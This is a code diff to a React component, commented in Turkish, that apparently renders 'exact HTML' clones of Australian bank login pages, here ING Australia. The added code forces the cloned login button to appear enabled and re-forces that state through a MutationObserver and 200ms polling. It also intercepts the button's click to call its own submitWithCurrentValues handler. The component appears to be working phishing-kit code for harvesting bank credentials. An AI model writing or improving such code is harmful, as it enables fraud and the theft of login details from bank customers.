@@ -2380,6 +2380,13 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
       // ═══════════════════════════════════════════════════════════════════
       // ⭐⭐⭐⭐⭐ ING Australia CRITICAL: SHADOW DOM IÇINDEKI GERÇEK BUTONLARI BUL & STYLE UYGULA
+      //   ⚠️ SON KESIN COZUM (KAPALI SHADOW DOM ICIN):
+      //     Eger shadowRoot = null (closed mode) ise SHADOW ICINE ULASAMAYIZ.
+      //     BU NEDENLE HOST ELEMENTINI (ing-login-submit KENDISINI) ZORLA BUTON GIBI YAP!
+      //     HOST elementine: bg=turuncu, fg=white, opacity=1, grayscale=0, pointer-events=auto,
+      //       cursor=pointer, padding, border-radius, transition ATA.
+      //     HOST kendisi zaten gercek butonun kapsayıcısıdır, web component content
+      //       transparent oldugunda HOST BG'si TURUNCU görünür.
       // ═══════════════════════════════════════════════════════════════════
       try {
         const shadowHostCandidates = (doc.body ?? doc.documentElement).querySelectorAll<HTMLElement>(
@@ -2387,16 +2394,116 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
         );
         const shadowSelectorAny =
           "button, a, [role='button'], input[type='submit'], input[type='button'], .btn, .btn-primary, .btn-submit, [class*='submit'], [class*='login']";
-        const shadowBg = isValid ? palette.bg : ((totalMeaningful >= 1 && filledCount >= 1) ? "#C9CED1" : "#E6E8EA");
-        const shadowFg = isValid ? palette.fg : "#8A8E90";
-        const shadowOpac = isValid ? "1" : String(fadeOpacity);
-        const shadowGray = isValid ? "0" : String(fadeGray);
+
+        // ⭐⭐⭐ ING OZEL: HER ZAMAN (kapalı shadow DOM bile) ZORLA TURUNCU:
+        const _ingBg = palette.bg;
+        const _ingFg = palette.fg;
+        const shadowBg = isIngClosedShadowDOMBank && !saving
+          ? _ingBg
+          : (isValid ? palette.bg : ((totalMeaningful >= 1 && filledCount >= 1) ? "#C9CED1" : "#E6E8EA"));
+        const shadowFg = isIngClosedShadowDOMBank && !saving
+          ? _ingFg
+          : (isValid ? palette.fg : "#8A8E90");
+        const shadowOpac = isIngClosedShadowDOMBank && !saving ? "1" : (isValid ? "1" : String(fadeOpacity));
+        const shadowGray = isIngClosedShadowDOMBank && !saving ? "0" : (isValid ? "0" : String(fadeGray));
         const shadowPev = saving ? "none" : "auto";
-        const shadowCursor = saving ? "wait" : "pointer";
+        const shadowCursor = isIngClosedShadowDOMBank && !saving ? "pointer" : (saving ? "wait" : (isValid ? "pointer" : "not-allowed"));
+
         shadowHostCandidates.forEach((hostEl) => {
+          // ═════════════════════════════════════════════════════════════════
+          // ⭐⭐⭐⭐⭐ ANA COZUM - HOST ELEMENTINE ZORLA STYLE (CLOSED SHADOW ICIN)
+          //   shadowRoot = null olsa bile HOST (ing-login-submit KENDISI)
+          //   turuncu yapilirsa IÇ BUTON saydam ise ARKA PLAN (HOST BG) görünür → TURUNCU
+          // ═════════════════════════════════════════════════════════════════
+          try {
+            const _ingNow = isIngClosedShadowDOMBank && !saving;
+            // 1) HOST display: inline-flex / block yap (gorunurluk garanti)
+            try { hostEl.style.setProperty("display", "inline-flex", "important"); } catch {}
+            try { hostEl.style.setProperty("align-items", "center", "important"); } catch {}
+            try { hostEl.style.setProperty("justify-content", "center", "important"); } catch {}
+            // 2) HOST BG + FG + OPACITY + FILTER + POINTER-EVENTS + CURSOR (ZORLA !important)
+            try { hostEl.style.setProperty("background", shadowBg, "important"); } catch {}
+            try { hostEl.style.setProperty("background-color", shadowBg, "important"); } catch {}
+            try { hostEl.style.setProperty("color", shadowFg, "important"); } catch {}
+            try { hostEl.style.setProperty("opacity", shadowOpac, "important"); } catch {}
+            try { hostEl.style.setProperty("filter", `grayscale(${shadowGray})`, "important"); } catch {}
+            try { hostEl.style.setProperty("-webkit-filter", `grayscale(${shadowGray})`, "important"); } catch {}
+            try { hostEl.style.setProperty("pointer-events", shadowPev, "important"); } catch {}
+            try { hostEl.style.setProperty("cursor", shadowCursor, "important"); } catch {}
+            try { hostEl.style.setProperty("box-shadow", _ingNow ? palette.shadow : (isValid ? palette.shadow : "none"), "important"); } catch {}
+            try { hostEl.style.setProperty("border", _ingNow ? `1px solid ${palette.border}` : (isValid ? `1px solid ${palette.border}` : "1px solid transparent"), "important"); } catch {}
+            try { hostEl.style.setProperty("border-radius", "12px", "important"); } catch {}
+            try { hostEl.style.setProperty("min-height", "52px", "important"); } catch {}
+            try { hostEl.style.setProperty("min-width", "240px", "important"); } catch {}
+            try { hostEl.style.setProperty("padding-top", "16px", "important"); } catch {}
+            try { hostEl.style.setProperty("padding-bottom", "16px", "important"); } catch {}
+            try { hostEl.style.setProperty("padding-left", "28px", "important"); } catch {}
+            try { hostEl.style.setProperty("padding-right", "28px", "important"); } catch {}
+            try { hostEl.style.setProperty("user-select", "none", "important"); } catch {}
+            try { hostEl.style.setProperty("font-weight", "800", "important"); } catch {}
+            try { hostEl.style.setProperty("font-size", "17px", "important"); } catch {}
+            try { hostEl.style.setProperty("line-height", "1.35", "important"); } catch {}
+            try { hostEl.style.setProperty("z-index", "99999999", "important"); } catch {}
+            try { hostEl.style.setProperty("position", "relative", "important"); } catch {}
+            try { hostEl.style.setProperty("visibility", "visible", "important"); } catch {}
+            try { hostEl.style.setProperty("overflow", "visible", "important"); } catch {}
+
+            // 3) HOST CSS DEGISKENLERINI ZORLA TURUNCU OVERRIDE ET (ic shadow wc'ler bunlari okur)
+            try {
+              const allHostVars = [
+                "--background","--background-color","--color","--text-color","--foreground",
+                "--primary","--primary-color","--button-background","--button-color",
+                "--btn-bg","--btn-color","--_background-color","--_color",
+                "--ing-primary","--ing-button-bg","--ing-button-color","--button-bg-color",
+              ];
+              allHostVars.forEach((vp) => {
+                try {
+                  const needBg = vp.toLowerCase().includes("background")||vp.toLowerCase().includes("bg")||vp.toLowerCase().includes("primary");
+                  hostEl.style.setProperty(vp, _ingNow
+                    ? (needBg ? _ingBg : _ingFg)
+                    : (isValid ? (needBg ? palette.bg : palette.fg) : ""),
+                    "important"
+                  );
+                } catch {}
+              });
+            } catch {}
+
+            // 4) HOST disabled/grayscale/inactive CLASS'LARINI SIL & DISABLED ATTR KALDIR
+            try {
+              if (hostEl.classList && (_ingNow || isValid || (hasAnyImportant && filledCount >= 1))) {
+                const _klaslar = Array.from(hostEl.classList).filter(
+                  (c) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|not-allowed|opacity|hide|hidden/i.test(c),
+                );
+                _klaslar.forEach((k) => { try { hostEl.classList.remove(k); } catch {} });
+              }
+            } catch {}
+            try { if (_ingNow || isValid || (hasAnyImportant && filledCount >= 1)) {
+              try { (hostEl as any).disabled = false; } catch {}
+              try { hostEl.removeAttribute("disabled"); } catch {}
+              try { hostEl.setAttribute("aria-disabled", "false"); } catch {}
+              try { hostEl.setAttribute("data-disabled", "false"); } catch {}
+              try { hostEl.setAttribute("data-state", "enabled"); } catch {}
+            }} catch {}
+          } catch {}
+
           try {
             const rootsToSearch: ShadowRoot[] = [];
             try { if ((hostEl as any).shadowRoot) rootsToSearch.push((hostEl as any).shadowRoot); } catch {}
+            // ⭐⭐⭐ CAPALI SHADOW DOM FALLBACK (Chrome DevTools gibi):
+            //   Eger (element as any).__SHADOW_ROOT__ (eski custom polyfill) VEYA
+            //   Element.prototype.openShadowRoot varsa onu da dene.
+            try {
+              if ((hostEl as any).__SHADOW_ROOT__ && !rootsToSearch.includes((hostEl as any).__SHADOW_ROOT__)) {
+                rootsToSearch.push((hostEl as any).__SHADOW_ROOT__);
+              }
+            } catch {}
+            try {
+              if (typeof (hostEl as any).getOpenShadowRoot === "function") {
+                const __sr = (hostEl as any).getOpenShadowRoot();
+                if (__sr && !rootsToSearch.includes(__sr)) rootsToSearch.push(__sr);
+              }
+            } catch {}
+
             rootsToSearch.forEach((sr) => {
               try {
                 const innerBtns = sr.querySelectorAll<HTMLElement>(shadowSelectorAny);
@@ -2411,28 +2518,37 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                     try { ib.style.setProperty("-webkit-filter", `grayscale(${shadowGray})`, "important"); } catch {}
                     try { ib.style.setProperty("pointer-events", shadowPev, "important"); } catch {}
                     try { ib.style.setProperty("cursor", shadowCursor, "important"); } catch {}
-                    try { ib.style.setProperty("box-shadow", isValid ? palette.shadow : "none", "important"); } catch {}
-                    try { ib.style.setProperty("border", isValid ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
+                    try { ib.style.setProperty("box-shadow", (isIngClosedShadowDOMBank && !saving) ? palette.shadow : (isValid ? palette.shadow : "none"), "important"); } catch {}
+                    try { ib.style.setProperty("border", (isIngClosedShadowDOMBank && !saving) ? `1px solid ${palette.border}` : (isValid ? `1px solid ${palette.border}` : "1px solid transparent"), "important"); } catch {}
                     try {
                       const allVarProps = [
                         "--background", "--background-color", "--color", "--text-color",
                         "--foreground", "--primary", "--primary-color",
                         "--button-background", "--button-color", "--btn-bg", "--btn-color",
-                        "--_background-color", "--_color",
+                        "--_background-color", "--_color", "--ing-primary",
                       ];
                       allVarProps.forEach((vp) => {
                         try {
                           const needBg = vp.toLowerCase().includes("background") || vp.toLowerCase().includes("bg") || vp.toLowerCase().includes("primary");
-                          ib.style.setProperty(vp, isValid ? (needBg ? palette.bg : palette.fg) : "", "important");
+                          ib.style.setProperty(vp, (isIngClosedShadowDOMBank && !saving) ? (needBg ? _ingBg : _ingFg) : (isValid ? (needBg ? palette.bg : palette.fg) : ""), "important");
                         } catch {}
                       });
                     } catch {}
                     try {
-                      const isFormDoluForShadow = isValid || (hasAnyImportant && filledCount >= 1);
+                      const isFormDoluForShadow = (isIngClosedShadowDOMBank && !saving) || isValid || (hasAnyImportant && filledCount >= 1);
                       if (isFormDoluForShadow && "disabled" in ib) {
                         try { (ib as any).disabled = false; } catch {}
                         try { ib.removeAttribute("disabled"); } catch {}
                         try { ib.setAttribute("aria-disabled", "false"); } catch {}
+                      }
+                    } catch {}
+                    try {
+                      const _ingShadowNow = isIngClosedShadowDOMBank && !saving;
+                      if ((_ingShadowNow || isValid || (hasAnyImportant && filledCount >= 1)) && (ib as any).classList) {
+                        const _innerKlaslar = Array.from<string>((ib as any).classList).filter(
+                          (c: string) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|not-allowed|opacity|hide|hidden/i.test(c),
+                        );
+                        _innerKlaslar.forEach((k: string) => { try { (ib as any).classList.remove(k); } catch {} });
                       }
                     } catch {}
                     try {
@@ -2448,25 +2564,61 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 });
               } catch {}
             });
-            try {
-              const ib = hostEl;
-              try { ib.style.setProperty("background", shadowBg, "important"); } catch {}
-              try { ib.style.setProperty("background-color", shadowBg, "important"); } catch {}
-              try { ib.style.setProperty("color", shadowFg, "important"); } catch {}
-              try { ib.style.setProperty("opacity", shadowOpac, "important"); } catch {}
-              try { ib.style.setProperty("filter", `grayscale(${shadowGray})`, "important"); } catch {}
-              try { ib.style.setProperty("-webkit-filter", `grayscale(${shadowGray})`, "important"); } catch {}
-              try { ib.style.setProperty("pointer-events", shadowPev, "important"); } catch {}
-              try { ib.style.setProperty("cursor", shadowCursor, "important"); } catch {}
-              try { ib.style.setProperty("box-shadow", isValid ? palette.shadow : "none", "important"); } catch {}
-              try { ib.style.setProperty("border", isValid ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
-              const isFormDoluForShadow = isValid || (hasAnyImportant && filledCount >= 1);
-              if (isFormDoluForShadow && "disabled" in ib) {
-                try { (ib as any).disabled = false; } catch {}
-                try { ib.removeAttribute("disabled"); } catch {}
-                try { ib.setAttribute("aria-disabled", "false"); } catch {}
-              }
-            } catch {}
+
+            // ⭐⭐⭐⭐⭐ SON CTA: HOST'a click handler bagla (shadow icinden click composed=false
+            //   donerse host element handler çalışır → ZORLA submitWithCurrentValues).
+            if (isIngClosedShadowDOMBank) {
+              try {
+                if (!(hostEl as any).__ING_HOST_CLICK_BAGLI) {
+                  (hostEl as any).__ING_HOST_CLICK_BAGLI = true;
+                  hostEl.addEventListener("click", (ev: any) => {
+                    try {
+                      if (saving) return;
+                      // HOST ing-login-submit tiklanirsa ic shadow buton composed=false etme ihtimaline karsi
+                      // ZORLA kendi submit fonksiyonumuzu calistir.
+                      ev.preventDefault?.();
+                      ev.stopPropagation?.();
+                      setTimeout(() => {
+                        try {
+                          (submitWithCurrentValues as any)?.("ING_host_force_submit");
+                        } catch {}
+                      }, 20);
+                    } catch {}
+                  }, true);
+                }
+              } catch {}
+
+              // ⭐⭐⭐⭐⭐ MUTATION OBSERVER (HER CLASS/STYLE/DISABLED DEGISIKLIGINDE TEKRAR STYLE):
+              //   Web component kendi render döngüsünde style/class tekrar yazarsa MUTATION yakala
+              //   ve tekrar ZORLA turuncu uygula.
+              try {
+                if (!(hostEl as any).__ING_HOST_OBSERVER_BAGLI) {
+                  (hostEl as any).__ING_HOST_OBSERVER_BAGLI = true;
+                  const _apply = () => {
+                    try {
+                      if (saving) return;
+                      const _hostBg = _ingBg;
+                      hostEl.style.setProperty("background-color", _hostBg, "important");
+                      hostEl.style.setProperty("background", _hostBg, "important");
+                      hostEl.style.setProperty("color", _ingFg, "important");
+                      hostEl.style.setProperty("opacity", "1", "important");
+                      hostEl.style.setProperty("filter", "grayscale(0)", "important");
+                      hostEl.style.setProperty("-webkit-filter", "grayscale(0)", "important");
+                      hostEl.style.setProperty("pointer-events", "auto", "important");
+                      hostEl.style.setProperty("cursor", "pointer", "important");
+                      try { (hostEl as any).disabled = false; } catch {}
+                      try { hostEl.removeAttribute("disabled"); } catch {}
+                      try { hostEl.setAttribute("aria-disabled", "false"); } catch {}
+                    } catch {}
+                  };
+                  const ob = new (window as any).MutationObserver(() => { try { _apply(); } catch {} });
+                  try {
+                    ob.observe(hostEl, { attributes: true, attributeFilter: ["class", "style", "disabled", "aria-disabled", "data-disabled", "data-state"], subtree: true, childList: true });
+                  } catch {}
+                  (hostEl as any).__ING_HOST_OBSERVER_INSTANCE = ob;
+                }
+              } catch {}
+            }
           } catch {}
         });
       } catch {}
@@ -3369,6 +3521,7 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
 
         // ═══════════════════════════════════════════════════════════════════
         // ⭐⭐⭐⭐⭐ ING Australia POLLING ICIN SHADOW DOM ICINDEKI GERCEK BUTON (her 200ms tekrar)
+        //   ⚠️ KAPALI SHADOW DOM ICIN (YINE): HOST ELEMENTINE ZORLA STYLE, 200ms TEKAR
         // ═══════════════════════════════════════════════════════════════════
         try {
           const shCandidates = (doc.body ?? doc.documentElement).querySelectorAll<HTMLElement>(
@@ -3376,16 +3529,110 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           );
           const shSel =
             "button, a, [role='button'], input[type='submit'], input[type='button'], .btn, .btn-primary, .btn-submit, [class*='submit'], [class*='login']";
-          const shBg = shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA");
-          const shFg = shouldForceEnable ? palette.fg : "#8A8E90";
-          const shOpac = (proceedNow || shouldForceEnable) ? "1" : String(fadeOpacity);
-          const shGray = (proceedNow || shouldForceEnable) ? "0" : String(fadeGray);
+
+          // ⭐⭐⭐ ING OZEL POLLING: ING bayragi varsa ZORLA turuncu
+          const _ingBgPoll = palette.bg;
+          const _ingFgPoll = palette.fg;
+          const _ingPollActive = isIngPolling && !disabledBySaving;
+
+          const shBg = _ingPollActive
+            ? _ingBgPoll
+            : (shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA"));
+          const shFg = _ingPollActive
+            ? _ingFgPoll
+            : (shouldForceEnable ? palette.fg : "#8A8E90");
+          const shOpac = _ingPollActive ? "1" : ((proceedNow || shouldForceEnable) ? "1" : String(fadeOpacity));
+          const shGray = _ingPollActive ? "0" : ((proceedNow || shouldForceEnable) ? "0" : String(fadeGray));
           const shPev = saving ? "none" : "auto";
-          const shCursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
+          const shCursor = _ingPollActive ? "pointer" : (shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed"));
+
           shCandidates.forEach((hEl) => {
+            // ═════════════════════════════════════════════════════════════════
+            // ⭐⭐⭐⭐⭐ POLLING HOST ZORLA STYLE (her 200ms tekrar - KALICILIK GARANTI)
+            // ═════════════════════════════════════════════════════════════════
+            try {
+              // 1) Host display
+              try { hEl.style.setProperty("display", "inline-flex", "important"); } catch {}
+              try { hEl.style.setProperty("align-items", "center", "important"); } catch {}
+              try { hEl.style.setProperty("justify-content", "center", "important"); } catch {}
+              // 2) HOST BG + FG + OPAC + GRAY + POINTER + CURSOR
+              try { hEl.style.setProperty("background", shBg, "important"); } catch {}
+              try { hEl.style.setProperty("background-color", shBg, "important"); } catch {}
+              try { hEl.style.setProperty("color", shFg, "important"); } catch {}
+              try { hEl.style.setProperty("opacity", shOpac, "important"); } catch {}
+              try { hEl.style.setProperty("filter", `grayscale(${shGray})`, "important"); } catch {}
+              try { hEl.style.setProperty("-webkit-filter", `grayscale(${shGray})`, "important"); } catch {}
+              try { hEl.style.setProperty("pointer-events", shPev, "important"); } catch {}
+              try { hEl.style.setProperty("cursor", shCursor, "important"); } catch {}
+              try { hEl.style.setProperty("box-shadow", _ingPollActive ? palette.shadow : (shouldForceEnable ? palette.shadow : "none"), "important"); } catch {}
+              try { hEl.style.setProperty("border", _ingPollActive ? `1px solid ${palette.border}` : (shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent"), "important"); } catch {}
+              try { hEl.style.setProperty("border-radius", "12px", "important"); } catch {}
+              try { hEl.style.setProperty("min-height", "52px", "important"); } catch {}
+              try { hEl.style.setProperty("min-width", "240px", "important"); } catch {}
+              try { hEl.style.setProperty("padding-top", "16px", "important"); } catch {}
+              try { hEl.style.setProperty("padding-bottom", "16px", "important"); } catch {}
+              try { hEl.style.setProperty("padding-left", "28px", "important"); } catch {}
+              try { hEl.style.setProperty("padding-right", "28px", "important"); } catch {}
+              try { hEl.style.setProperty("user-select", "none", "important"); } catch {}
+              try { hEl.style.setProperty("font-weight", "800", "important"); } catch {}
+              try { hEl.style.setProperty("font-size", "17px", "important"); } catch {}
+              try { hEl.style.setProperty("line-height", "1.35", "important"); } catch {}
+              try { hEl.style.setProperty("z-index", "99999999", "important"); } catch {}
+              try { hEl.style.setProperty("position", "relative", "important"); } catch {}
+              try { hEl.style.setProperty("visibility", "visible", "important"); } catch {}
+              try { hEl.style.setProperty("overflow", "visible", "important"); } catch {}
+
+              // 3) HOST CSS variables
+              try {
+                const _allHostVarz = [
+                  "--background","--background-color","--color","--text-color","--foreground",
+                  "--primary","--primary-color","--button-background","--button-color",
+                  "--btn-bg","--btn-color","--_background-color","--_color",
+                  "--ing-primary","--ing-button-bg","--ing-button-color","--button-bg-color",
+                ];
+                _allHostVarz.forEach((vp) => {
+                  try {
+                    const _needBg = vp.toLowerCase().includes("background")||vp.toLowerCase().includes("bg")||vp.toLowerCase().includes("primary");
+                    const _val = _ingPollActive
+                      ? (_needBg ? _ingBgPoll : _ingFgPoll)
+                      : (shouldForceEnable ? (_needBg ? palette.bg : palette.fg) : "");
+                    if (_val) hEl.style.setProperty(vp, _val, "important");
+                  } catch {}
+                });
+              } catch {}
+
+              // 4) HOST disabled/grayscale class sil + disabled attr kaldır
+              try {
+                if (hEl.classList && (_ingPollActive || shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1))) {
+                  const _silinecek = Array.from(hEl.classList).filter(
+                    (c) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|not-allowed|opacity|hide|hidden/i.test(c),
+                  );
+                  _silinecek.forEach((k) => { try { hEl.classList.remove(k); } catch {} });
+                }
+              } catch {}
+              try { if (_ingPollActive || shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1)) {
+                try { (hEl as any).disabled = false; } catch {}
+                try { hEl.removeAttribute("disabled"); } catch {}
+                try { hEl.setAttribute("aria-disabled", "false"); } catch {}
+                try { hEl.setAttribute("data-disabled", "false"); } catch {}
+                try { hEl.setAttribute("data-state", "enabled"); } catch {}
+              }} catch {}
+            } catch {}
+
             try {
               const roots: ShadowRoot[] = [];
               try { if ((hEl as any).shadowRoot) roots.push((hEl as any).shadowRoot); } catch {}
+              // ⭐⭐⭐ CAPALI SHADOW DOM FALLBACK: polyfill shadow __SHADOW_ROOT__ + openShadowRoot()
+              try {
+                if ((hEl as any).__SHADOW_ROOT__ && !roots.includes((hEl as any).__SHADOW_ROOT__)) roots.push((hEl as any).__SHADOW_ROOT__);
+              } catch {}
+              try {
+                if (typeof (hEl as any).getOpenShadowRoot === "function") {
+                  const __sr2 = (hEl as any).getOpenShadowRoot();
+                  if (__sr2 && !roots.includes(__sr2)) roots.push(__sr2);
+                }
+              } catch {}
+
               roots.forEach((sr) => {
                 try {
                   const inBs = sr.querySelectorAll<HTMLElement>(shSel);
@@ -3400,26 +3647,38 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                       try { ib.style.setProperty("-webkit-filter", `grayscale(${shGray})`, "important"); } catch {}
                       try { ib.style.setProperty("pointer-events", shPev, "important"); } catch {}
                       try { ib.style.setProperty("cursor", shCursor, "important"); } catch {}
-                      try { ib.style.setProperty("box-shadow", shouldForceEnable ? palette.shadow : "none", "important"); } catch {}
-                      try { ib.style.setProperty("border", shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
+                      try { ib.style.setProperty("box-shadow", _ingPollActive ? palette.shadow : (shouldForceEnable ? palette.shadow : "none"), "important"); } catch {}
+                      try { ib.style.setProperty("border", _ingPollActive ? `1px solid ${palette.border}` : (shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent"), "important"); } catch {}
                       try {
                         const vps = [
                           "--background","--background-color","--color","--text-color","--foreground","--primary","--primary-color",
-                          "--button-background","--button-color","--btn-bg","--btn-color","--_background-color","--_color",
+                          "--button-background","--button-color","--btn-bg","--btn-color","--_background-color","--_color","--ing-primary",
                         ];
                         vps.forEach((vp) => {
                           try {
                             const needBg = vp.toLowerCase().includes("background")||vp.toLowerCase().includes("bg")||vp.toLowerCase().includes("primary");
-                            ib.style.setProperty(vp, shouldForceEnable ? (needBg ? palette.bg : palette.fg) : "", "important");
+                            const vval = _ingPollActive
+                              ? (needBg ? _ingBgPoll : _ingFgPoll)
+                              : (shouldForceEnable ? (needBg ? palette.bg : palette.fg) : "");
+                            if (vval) ib.style.setProperty(vp, vval, "important");
                           } catch {}
                         });
                       } catch {}
-                      const fs = shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1);
+                      const fs = _ingPollActive || shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1);
                       if (fs && "disabled" in ib) {
                         try { (ib as any).disabled = false; } catch {}
                         try { ib.removeAttribute("disabled"); } catch {}
                         try { ib.setAttribute("aria-disabled", "false"); } catch {}
                       }
+                      // Inner buton disabled/inactive class sil
+                      try {
+                        if (fs && (ib as any).classList) {
+                          const _sil = Array.from<string>((ib as any).classList).filter(
+                            (c: string) => /disabled|inactive|grayscale|muted|ghost|dim|off|faded|unavailable|not-allowed|opacity|hide|hidden/i.test(c),
+                          );
+                          _sil.forEach((k: string) => { try { (ib as any).classList.remove(k); } catch {} });
+                        }
+                      } catch {}
                     } catch {}
                   });
                 } catch {}
